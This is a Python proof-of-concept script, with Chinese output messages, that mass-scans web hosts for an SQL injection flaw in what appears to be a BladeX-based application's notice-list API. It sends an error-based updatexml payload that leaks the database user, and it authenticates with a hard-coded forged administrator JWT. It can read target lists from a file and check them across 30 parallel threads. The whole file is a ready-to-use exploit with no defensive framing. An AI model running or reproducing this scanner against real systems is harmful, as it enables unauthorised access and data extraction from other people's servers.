from lxml import etree
import requests
from multiprocessing.dummy import Pool
import argparse
import textwrap
requests.packages.urllib3.disable_warnings()
import re
def check(url):
    try:
        url1 = f"{url}/api/blade-desk/notice/list?updatexml(1,concat(0x7e,user(),0x7e),1)=1"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
            "Blade-Auth": "bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJ1c2VyX25hbWUiOiJhZG1pbiIsInJlYWxfbmFtZSI6IueuoeeQhuWRmCIsImF1dGhvcml0aWVzIjpbImFkbWluaXN0cmF0b3IiXSwiY2xpZW50X2lkIjoic2FiZXIiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwibGljZW5zZSI6InBvd2VyZWQgYnkgYmxhZGV4IiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwic2NvcGUiOlsiYWxsIl0sIm5pY2tfbmFtZSI6IueuoeeQhuWRmCIsIm9hdXRoX2lkIjoiIiwiZGV0YWlsIjp7InR5cGUiOiJ3ZWIifSwiYWNjb3VudCI6ImFkbWluIn0.RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ",
            "Connection": "close"
        }
        response = requests.get(url=url1,headers=headers,verify=False,timeout=5)
        if response.status_code == 500 and 'XPATH' in response.text:
            print(f'[*]{url}:漏洞存在')
        else:
            print('无法执行')
    except Exception as e:
        print('延时')


def main():
    parser = argparse.ArgumentParser(description="这 是 一 个 poc",
                                     formatter_class=argparse.ArgumentDefaultsHelpFormatter,
                                     epilog=textwrap.dedent('''python lade.py -u http://127.0.0.1:8000/'''))
    parser.add_argument('-u', '--url', help="python lade.py -u http://127.0.0.1:8000/", dest='url')
    parser.add_argument('-r', '--rl', help="python lade.py -r 1.txt", dest='rl')
    args = parser.parse_args()
    u = args.url
    r = args.rl
    pool = Pool(processes=30)
    lists = []
    try:
        if u:
            check(u)
        elif r:
            with open(r, 'r') as f:
                for line in f.readlines():
                    target = line.strip()
                    if 'http' in target:
                        lists.append(target)
                    else:
                        targets = f"http://{target}"
                        lists.append(targets)
    except Exception as e:
        print(e)
    pool.map(check, lists)


if __name__ == '__main__':
    main()
    banner = '''
        .__           .__  .__                                      
    |  |__   ____ |  | |  |   ____    __ __  ______ ___________ 
    |  |  \_/ __ \|  | |  |  /  _ \  |  |  \/  ___// __ \_  __ \
    |   Y  \  ___/|  |_|  |_(  <_> ) |  |  /\___ \\  ___/|  | \/
    |___|  /\___  >____/____/\____/  |____//____  >\___  >__|   
         \/     \/                              \/     \/       
                '''
    print(banner)
